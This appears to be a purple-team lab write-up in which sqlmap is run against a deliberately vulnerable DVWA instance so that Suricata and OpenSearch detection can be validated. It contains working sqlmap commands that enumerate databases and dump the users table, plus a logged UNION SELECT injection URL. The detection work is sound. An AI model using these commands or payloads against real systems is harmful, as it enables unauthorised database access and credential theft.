# Detection Example: SQLmap Attack → SIEM Alert

This document walks through a purple team exercise demonstrating the full detection pipeline from attack execution to SIEM alert.

## Scenario

**Objective:** Validate SQL injection detection capabilities  
**Attack Platform:** sear (Kali) on VLAN 20 (10.10.20.20)  
**Target:** DVWA on VLAN 40 (10.10.40.10)  
**Expected:** Suricata alerts, full network flow capture, SIEM visibility

---

## Attack Execution

### Step 1: Prepare DVWA

1. Access DVWA at http://10.10.40.10
2. Login with default credentials (admin/password)
3. Set Security Level to "Low" via DVWA Security menu
4. Navigate to SQL Injection page

### Step 2: Launch SQLmap

From sear (Kali):

```bash
# Basic SQL injection test
sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       --batch \
       --dbs
```

**Flags explained:**
- `-u`: Target URL with injectable parameter
- `--cookie`: Session cookie (get from browser)
- `--batch`: Non-interactive mode
- `--dbs`: Enumerate databases

### Step 3: Escalate Attack

```bash
# Dump database contents
sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       --batch \
       -D dvwa \
       --tables

# Extract user credentials
sqlmap -u "http://10.10.40.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       --batch \
       -D dvwa \
       -T users \
       --dump
```

---

## Detection Results

### Suricata Alerts

The following signatures triggered during the attack:

```json
{
  "event_type": "alert",
  "src_ip": "10.10.20.20",
  "dest_ip": "10.10.40.10",
  "alert": {
    "signature": "ET WEB_SERVER SQL Injection Attempt - UNION SELECT",
    "signature_id": 2006446,
    "severity": 1,
    "category": "Web Application Attack"
  }
}
```

**Common signatures triggered:**
- ET WEB_SERVER SQL Injection Attempt (multiple variants)
- ET WEB_SERVER UNION SELECT
- ET WEB_SERVER Boolean-based SQL Injection
- ET WEB_SERVER Time-based SQL Injection

### Network Flow Statistics

From the attack session:

| Metric | Value |
|--------|-------|
| Total Flows | 10,000+ |
| Unique Requests | 2,500+ |
| Time Duration | ~15 minutes |
| Bytes Transferred | 45 MB |

### OpenSearch Query

Search for SQLmap activity:

```json
GET fluentbit-default/_search
{
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "alert"}},
        {"term": {"src_ip": "10.10.20.20"}},
        {"term": {"dest_ip": "10.10.40.10"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  },
  "sort": [{"@timestamp": "desc"}],
  "size": 100
}
```

---

## Isolation Verification

**Critical Test:** Confirm VLAN 40 isolation prevented lateral movement.

From DVWA VM (10.10.40.10):

```bash
# These should all fail
ping 10.10.20.10    # QNAP - blocked
ping 10.10.30.40    # DC01 - blocked
ping 10.10.10.1     # Gateway - blocked
ping 8.8.8.8        # Internet - blocked
```

**Expected Result:** All pings fail, confirming target VLAN is properly isolated.

---

## Dashboard Visibility

### NIDS - Detection Overview

The SQLmap attack should appear as:
- Spike in alert volume
- Top signature: SQL Injection attempts
- Source: 10.10.20.20 (sear)
- Destination: 10.10.40.10 (DVWA)

### Timeline View

1. Attack starts: Initial probing requests
2. Injection attempts: UNION SELECT payloads
3. Database enumeration: Multiple queries
4. Data extraction: Table dumps

---

## Key Takeaways

1. **Suricata Detection:** ET Open rules effectively detected SQLmap's signatures
2. **Full Visibility:** All 10K+ flows captured via SPAN port
3. **VLAN Isolation:** Target network properly contained the "compromise"
4. **SIEM Correlation:** Alerts and flows visible in OpenSearch within seconds

---

## Sample Alert JSON

```json
{
  "@timestamp": "2026-01-09T14:30:45.123Z",
  "event_type": "alert",
  "src_ip": "10.10.20.20",
  "src_port": 45678,
  "dest_ip": "10.10.40.10",
  "dest_port": 80,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2006446,
    "rev": 12,
    "signature": "ET WEB_SERVER SQL Injection Attempt - UNION SELECT",
    "category": "Web Application Attack",
    "severity": 1
  },
  "http": {
    "hostname": "10.10.40.10",
    "url": "/vulnerabilities/sqli/?id=1' UNION SELECT null,null--&Submit=Submit",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 200
  },
  "source": "suricata",
  "vlan": "SOC"
}
```

---

## Next Steps

- [ ] Document additional attack scenarios (XSS, RFI, etc.)
- [ ] Create custom Suricata rules for lab-specific detections
- [ ] Map detections to MITRE ATT&CK techniques
- [ ] Automate attack → detection validation
